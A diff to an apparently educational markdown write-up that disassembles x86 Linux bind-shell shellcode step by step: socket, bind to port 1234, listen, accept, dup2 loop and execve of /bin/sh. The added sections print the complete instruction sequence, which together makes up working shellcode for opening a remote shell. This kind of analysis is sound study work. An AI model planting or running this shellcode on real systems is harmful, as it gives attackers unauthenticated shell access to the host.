@@ -136,24 +136,24 @@ $ echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e
 
 The analysis of this shellcode will be divided into six parts, corresponding to the system calls called. 
 
-###socket()###
+### socket() ###
 ```nasm
-00000000  31DB           xor ebx,ebx					
-00000002  F7E3           mul ebx 				
-00000004  53             push ebx 					
-00000005  43             inc ebx 				
-00000006  53             push ebx 				
-00000007  6A02           push byte +0x2 			
-00000009  89E1           mov ecx,esp 				
-0000000B  B066           mov al,0x66 				
-0000000D  CD80           int 0x80				
+00000000  31DB             xor ebx,ebx					
+00000002  F7E3             mul ebx 				
+00000004  53               push ebx 					
+00000005  43               inc ebx 				
+00000006  53               push ebx 				
+00000007  6A02             push byte +0x2 			
+00000009  89E1             mov ecx,esp 				
+0000000B  B066             mov al,0x66 				
+0000000D  CD80             int 0x80				
 ```
 At the beginning a socket is prepared, which will serve as the interface on which the bind shell will listen for the connection. For this purpose, socket() syscall is used, called from socketcall()) syscall, taking the following arguments as components:
 - socket(AF_INET, SOCK_STREAM, IPPROTO_IP). 
 
 An interesting fact is that in the case of the whole shellcode,  socket(), bind(), listen(), accept() and dup2() syscalls are called from the same, repeated socketcall() syscall.
 
-For this purpose, the EBX, EAX and EDX registers are first cleaned. Using the mul instruction reduces the shellcode length by 1.
+- For this purpose, the EBX, EAX and EDX registers are first cleaned. Using the mul instruction reduces the shellcode length by 1.
 ```nasm
 00000000  31DB              xor ebx,ebx					
 00000002  F7E3              mul ebx
@@ -189,9 +189,206 @@ Then, in the reverse order, the values of the above arguments are thrown onto th
 ```			
 ------------------------------------------------------------------------------------------------------------------------
 
+### bind() ###
+```nasm
+0000000F  5B                pop ebx 		
+00000010  5E                pop esi
+00000011  52                push edx 					
+00000012  68020004D2        push dword 0xd2040002		
+00000017  6A10              push byte +0x10 			
+00000019  51                push ecx 				
+0000001A  50                push eax 				
+0000001B  89E1              mov ecx,esp 		
+0000001D  6A66              push byte +0x66 			
+0000001F  58                pop eax 				
+00000020  CD80              int 0x80 					
+```
+Then, bind() syscall will be called with the same method.
+- Popping value 2 into the ebx (sys_bind call)
+```nasm
+0000000F  5B                pop ebx
+```
+- 'Top of the stack' adjusting, equivalent to -> sub esp, 4
+```nasm
+00000010  5E                pop esi
+```
+- Pushing 0, which is the struct beginning (0, becouse of listening address, which is 0.0.0.0)
+```nasm
+00000011  52                push edx
+```
+- Pushing d204 -> in reverse 04d2(hex) = 1234(dec) - our LPORT, and 0002(hex) = 2(dec) which is the third argument (it is like `push word 2` - AF_INET = 2)
+```nasm
+00000012  68020004D2        push dword 0xd2040002
+```
+- Pushing value 16, which is the socklen_t addrlen (size) = 16
+```nasm
+00000017  6A10              push byte +0x10
+```
+- Pushing const struct sockaddr *addr - stack pointer with struct arguments
+```nasm
+00000019  51                push ecx
+```
+- Pushing our sockfd pointer
+0000001A  50                push eax
+```
+- Directing the stack pointer to bind() syscall arguments
+```nasm
+0000001B  89E1              mov ecx,esp
+```
+- Pushing call to socketcall syscall on top of the stack
+```nasm
+0000001D  6A66              push byte +0x66
+```
+- Popping above value into EAX
+```nasm
+0000001F  58                pop eax
+```
+- Syscall execution
+```nasm
+00000020  CD80              int 0x80
+```
+------------------------------------------------------------------------------------------------------------------------
 
+### listen() ###
 
+```nasm
+00000022  894104            mov [ecx+0x4],eax 			
+00000025  B304              mov bl,0x4 					
+00000027  B066              mov al,0x66 				
+00000029  CD80              int 0x80 					
+```
+The next system call called is listen().
+- ECX points to the stack, so [ECX+4] will points to the next pushed value -> pushing EAX (sockfd address) on the stack
+```nasm
+00000022  894104            mov [ecx+0x4],eax
+```
+- Moving 4 to EBX (listen() call)
+```nasm
+00000025  B304              mov bl,0x4
+```
+- Moving call to socketcall() syscall on top of the stack
+```nasm
+00000027  B066              mov al,0x66
+```
+- Syscall execution
+```nasm
+00000029  CD80              int 0x80
+```
+------------------------------------------------------------------------------------------------------------------------
 
+### accept() ###
+```nasm
+0000002B  43                inc ebx 					
+0000002C  B066              mov al,0x66 				
+0000002E  CD80              int 0x80 					
+```
+
+The next system call called is accept (). Actions like before:
+- Incrementing EBX (accept() call = 5)
+```nasm
+0000002B  43                inc ebx
+```
+- Call to socketcall() syscall
+```nasm
+0000002C  B066              mov al,0x66
+```
+- Syscall execution (ECX already points to top of the stack (arguments))
+```nasm
+0000002E  CD80              int 0x80
+```
+------------------------------------------------------------------------------------------------------------------------
+
+### dup2() ###
+```nasm
+00000030  93                xchg eax,ebx 				
+00000031  59                pop ecx
+00000032  6A3F              push byte +0x3f
+00000034  58                pop eax
+00000035  CD80              int 0x80
+00000037  49                dec ecx
+00000038  79F8              jns 0x32
+```
+Then three dup2() syscalls will be called. For this shellcode, a loop that is executed three times (STDIN = 0, STDOUT = 1, STDERR = 2) will be used for this.
+- We exchange values of EAX and EBX registers
+```nasm
+00000030  93                xchg eax,ebx
+```
+- Pop address from top of the stack to the ECX registry (it is a value of 3, as many as the loop should be repeated)
+```nasm
+00000031  59                pop ecx
+```
+- push the value 63 on the stack
+```nasm
+00000032  6A3F              push byte +0x3f
+```
+- pop the value 63 to the EAX registry
+```nasm
+00000034  58                pop eax
+```
+- syscall execution
+```nasm
+00000035  CD80              int 0x80
+```
+- ECX registry decrementation (3 --> 2)
+```nasm
+00000037  49                dec ecx
+```
+- loop operating dup2() system calls
+```nasm
+00000038  79F8              jns 0x32
+```
+------------------------------------------------------------------------------------------------------------------------
+
+### execve() ###
+```nasm
+0000003A  682F2F7368        push dword 0x68732f2f
+0000003F  682F62696E        push dword 0x6e69622f
+00000044  89E3              mov ebx,esp
+00000046  50                push eax
+00000047  53                push ebx
+00000048  89E1              mov ecx,esp
+0000004A  B00B              mov al,0xb
+0000004C  CD80              int 0x80
+```
+The last syscall will be execve(), which will run /bin/sh after connecting to the listening port
+- pushing value "//sh" on the stack (reverse order)
+```nasm
+0000003A  682F2F7368        push dword 0x68732f2f
+```
+- pushing value "/bin" on the stack (reverse order)
+```nasm
+0000003F  682F62696E        push dword 0x6e69622f
+```
+- we transfer the top of the stack address to the EBX registry
+```nasm
+00000044  89E3              mov ebx,esp
+```
+- string terminator (null)
+```nasm
+00000046  50                push eax
+```
+- pushing previous stack pointer 
+```nasm
+00000047  53                push ebx
+```
+- setting new stack pointer pointing our arguments
+```nasm
+00000048  89E1              mov ecx,esp
+```
+- moving 11 (value of execve() syscall) to EAX
+```nasm
+0000004A  B00B              mov al,0xb
+```
+- syscall execution
+```nasm
+0000004C  CD80              int 0x80
+```
+------------------------------------------------------------------------------------------------------------------------
+
+That's all! The port is opened, and after connecting to it we get the /bin/sh shell.
+### Pwned. ###
+
+------------------------------------------------------------------------------------------------------------------------
 
 
 
